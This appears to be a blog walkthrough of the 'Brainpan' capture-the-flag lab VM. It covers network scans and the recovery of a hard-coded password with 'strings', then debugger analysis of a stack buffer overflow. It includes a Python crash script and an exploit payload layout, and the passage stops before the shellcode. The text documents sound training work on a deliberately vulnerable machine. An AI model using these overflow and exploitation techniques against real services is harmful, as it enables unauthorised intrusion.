---
layout: post
title: PENTEST LAB - BRAINPAN (probably the fastest way)
date: '2014-06-13T23:01:00.000+02:00'
author: marcing
tags:
- hacking challenge
- penetration testing
- brainpan
- exploitation
- pentest lab
- pentests
- reverse engineering
modified_time: '2014-06-13T23:08:26.080+02:00'
thumbnail: http://4.bp.blogspot.com/-6KHOv5VU4qQ/U5th6bR9Y4I/AAAAAAAAAHk/6ZzzvPVklzI/s72-c/1.jpg
blogger_id: tag:blogger.com,1999:blog-252370192815002266.post-1658282663994224584
blogger_orig_url: https://blog.pentests.pl/2014/06/pentest-lab-brainpan-probably-the-fastest.html
excerpt: Hi and welcome! This is "PENTEST LAB" series, featuring "Brainpan" challenge walkthrough.
---

Hi and welcome! This is "PENTEST LAB" series, featuring "Brainpan" challenge walkthrough.
After my success with "<a href="http://vulnhub.com/entry/brainpan_2,56/" target="top">Brainpan: 2</a>"
challenge (<a href="http://blog.pentests.pl/2014/06/pentest-lab-brainpan-2-part-i-access.html" target="top">part I</a>
and <a href="http://blog.pentests.pl/2014/06/pentest-lab-brainpan-2-part-ii-rooting.html" target="top">part II</a>)
I've decided to look into the first version. I've grabbed file from <a href="http://download.vulnhub.com/brainpan/Brainpan.zip" target="top">here</a>.
It's configured like the second one and will grab IP address from DHCP.

<div class="spacer"></div>  
### <center>!!!SPOILER ALERT!!!</center>
<div class="spacer"></div> 

If you want to finish this challenge alone stop reading here.

GOAL: Obtain root on the system.

Challenge accepted!

Like always, let's look for the IP first:

<div class="cssterm">
&nbsp;Currently scanning: Finished!&nbsp;&nbsp; |&nbsp;&nbsp; Screen View: Unique Hosts&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;2 Captured ARP Req/Rep packets, from 2 hosts.&nbsp;&nbsp; Total size: 102
&nbsp;_____________________________________________________________________________
&nbsp;&nbsp; IP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; At MAC Address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Count&nbsp; Len&nbsp;&nbsp; MAC Vendor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;-----------------------------------------------------------------------------
&nbsp;192.168.57.1&nbsp;&nbsp;&nbsp; 08:00:27:da:53:b9&nbsp;&nbsp;&nbsp; 01&nbsp;&nbsp;&nbsp; 060&nbsp;&nbsp; CADMUS COMPUTER SYSTEMS&nbsp;&nbsp;
&nbsp;192.168.57.9&nbsp;&nbsp;&nbsp; 08:00:27:13:67:1a&nbsp;&nbsp;&nbsp; 01&nbsp;&nbsp;&nbsp; 042&nbsp;&nbsp; CADMUS COMPUTER SYSTEMS
</div>

Now check open ports:

<div class="cssterm">
Starting Nmap 6.45 ( http://nmap.org ) at 2014-06-04 15:02 CEST
Nmap scan report for 192.168.57.9
Host is up (0.00022s latency).
Not shown: 11998 closed ports
PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; STATE SERVICE VERSION
9999/tcp&nbsp; open&nbsp; abyss?
10000/tcp open&nbsp; http&nbsp;&nbsp;&nbsp; SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-title: Site doesn't have a title (text/html).
| ndmp-version:
|_&nbsp; ERROR: Failed to get host information from server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port9999-TCP:V=6.45%I=7%D=6/4%Time=538F18D7%P=x86_64-unknown-linux-gnu%
SF:r(NULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\
SF:|_\|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\
SF:x20\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_
SF:\|\x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
SF:\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x2
SF:0_\|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x
SF:20\x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\
SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x
SF:20\x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINP
SF:AN\x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENT
SF:ER\x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20");
MAC Address: 08:00:27:13:67:1A (Cadmus Computer Systems)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT&nbsp;&nbsp;&nbsp;&nbsp; ADDRESS
1&nbsp;&nbsp; 0.22 ms 192.168.57.9

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.57 seconds
</div>

Two ports 9999 and 10000. Looks similar to Brainpan:2. HtppSimpleServer (Python)
and custom app. HttpServer hosts image. I've launched dirbuster against it. While
dirbuster was working I've checked custom app from 9999.

<div class="cssterm">
$ nc 192.168.57.9 9999
  _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  _|_|_|&nbsp;&nbsp;&nbsp; _|&nbsp; _|_|&nbsp;&nbsp;&nbsp; _|_|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp;&nbsp;&nbsp; _|_|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp; _|_|_|&nbsp;
  _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|
  _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|
  _|_|_|&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|_|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp; _|&nbsp;&nbsp;&nbsp; _|
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|

  [________________________ WELCOME TO BRAINPAN _________________________]
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ENTER THE PASSWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;&gt; </div>

A banner with prompt for password. After playing with it for a while I had nothing
and went to dirbuster to check its findings. One folder found with some binary inside.
I've downloaded it and checked with "file" command. Looks like a windows binary.
Running strings against it gave me this:

<div class="cssterm">
$ strings http10000-brainpan.exe
  [^_]
  AAAA
  AAAA
  AAAA
  AAAA
  AAAA
  AAAA
  AAAA
  AAAA
  [^_]
  [get_reply] s = [%s]
  [get_reply] copied %d bytes to buffer
  shitstorm
  _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  _|_|_|&nbsp;&nbsp;&nbsp; _|&nbsp; _|_|&nbsp;&nbsp;&nbsp; _|_|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp;&nbsp;&nbsp; _|_|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp; _|_|_|&nbsp;
  _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|
  _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|
  _|_|_|&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|_|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp; _|&nbsp;&nbsp;&nbsp; _|
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|
  [________________________ WELCOME TO BRAINPAN _________________________]
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ENTER THE PASSWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;&gt;
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ACCESS DENIED
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ACCESS GRANTED
  [+] initializing winsock...
  [!] winsock init failed: %d
  done.
  [!] could not create socket: %d
  [+] server socket created.
  [!] bind failed: %d
  [+] bind done on port %d
  [+] waiting for connections.
  [+] received connection.
  [+] check is %d
  [!] accept failed: %d
  [+] cleaning up.
</div>

The "<b>shitstorm</b>" caught my attention and I've typed it as password in the custom app.

<div class="cssterm">
$ nc 192.168.57.9 9999
  _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  _|_|_|&nbsp;&nbsp;&nbsp; _|&nbsp; _|_|&nbsp;&nbsp;&nbsp; _|_|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp;&nbsp;&nbsp; _|_|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp; _|_|_|&nbsp;
  _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|
  _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|
  _|_|_|&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|_|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp; _|&nbsp;&nbsp;&nbsp; _|
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|

  [________________________ WELCOME TO BRAINPAN _________________________]
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ENTER THE PASSWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;&gt; shitstorm
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ACCESS GRANTED
</div>

Access granted and "Connection closed"...looks like that app is only checking the
pass and then closing the connection. That leaves me with only one way inside
system...through exploiting that app. What I knew at that point:
- system is running with one IP: <b>192.168.57.9</b>
- two ports are open: <b>9999 </b>and <b>10000</b>
- python <b>SimpleHtppServer </b>on <b>10000</b>
- custom app on <b>9999</b>, running in wine
- app binary accessible through http server
- app must be exploited in order to get inside system

I had two choices here, since app is a windows binary I could debug it in windows
machine or try with wine and ollydbg in linux. I chose the second option and
stayed with Linux. That binary is some kind of server, it opens socket and waits
for connections. When connection occurs it reads input and checks whether it equals
the magic string and then closes the connection. I've made some tests to check if
I can crash it. Indeed, providing very long input crashed the app.

I started with debugging proper working server. There's a method named "get_reply"
which is called after accepting connection from user. I set a breakpoint on exit
point (instruction <b>RETN </b>and <b>LEAVE</b>) from that method, connected to
the server and sent some "aaaa" as input. Below screen showing my data inside memory.

<div class="separator" style="clear: both; text-align: center;">
  <a href="/images/2014-06-13/1.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;">
    <img border="0" src="/images/2014-06-13/1.jpg" height="332" width="640" />
  </a>
</div>

Worth noting is the beginning address of provided data which is <b>0x0043F600</b>.
Going one step further:

<div class="separator" style="clear: both; text-align: center;">
  <a href="/images/2014-06-13/2.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;">
    <img border="0" src="/images/2014-06-13/2.jpg" height="394" width="640" />
  </a>
</div>

ESP is now pointing to the address<b> 0x0043F80C</b> with value <b>311715EB </b>if
we proceed we can see that's the address the program jumps to:

<div class="separator" style="clear: both; text-align: center;">
  <a href="/images/2014-06-13/3.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;">
    <img border="0" src="/images/2014-06-13/3.jpg" height="394" width="640" />
  </a>
</div>

Let's do some calculations: <b>0xF80C-0xF600=0x20C=524</b>. So providing input longer
than 524 chars will break the app. I've created python script for that purpose.

```py
import sys,socket

payload = ("a"*550)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((sys.argv[1],int(sys.argv[2])))

print s.recv(1024)
s.send(payload)
print s.recv(1024)

s.close()
```

Later I'll use that script for exploitation because I'll probably need a  way to
send hex (binary) data to the server as my input. Below you can see how app copies
550 bytes to buffer:

<div class="separator" style="clear: both; text-align: center;">
  <a href="/images/2014-06-13/4.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;">
    <img border="0" src="/images/2014-06-13/4.jpg" height="368" width="640" />
  </a>
</div>

Let's check address <b>0x0043F80C</b>:

<div class="separator" style="clear: both; text-align: center;">
  <a href="/images/2014-06-13/5.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;">
    <img border="0" src="/images/2014-06-13/5.jpg" height="392" width="640" />
  </a>
</div>

it's value has been overwritten with <b>61</b>'s ('<b>a</b>') and app crashed while
trying to read memory at address <b>0x61616161</b>:

<div class="separator" style="clear: both; text-align: center;">
  <a href="/images/2014-06-13/6.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;">
    <img border="0" src="/images/2014-06-13/6.jpg" height="400" width="342" />
  </a>
</div>

What I needed now is the way to execute my code by making app jumping into it. Unfortunately
I couldn't provide address at which my variable is stored because there were 0's in it.
"<b>\x00</b>" is called null byte and when app reads user input it'll stop at that byte.
I've started looking for another way...if you check the last image you will see that, after the jump,
<b>ESP </b>points to address <b>0x0043F810</b>. My data is there so I can write there anything.
The only needed thing now is "<b>JMP ESP</b>" somewhere in the app code. I've opened a binary in
<b>hte</b>, changed mode to "<b>pe/image</b>", <b>F7</b> for search, changed mode to "<b>display: regex</b>"
and searched for "<b>jmp.+esp</b>". Here's the result:

<div class="separator" style="clear: both; text-align: center;">
  <a href="/images/2014-06-13/12.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;">
    <img border="0" src="/images/2014-06-13/12.jpg" height="266" width="320" />
  </a>
</div>

My payload will need to look like that:  
`| 524 bytes of garbage | jmp esp address | nop sled (just in case) | shellcode |`  
I have "notepad.exe" in wine so I created needed code (mind the -b option, with it and
"\x00" as value, created code won't have any null bytes which is crucial here):

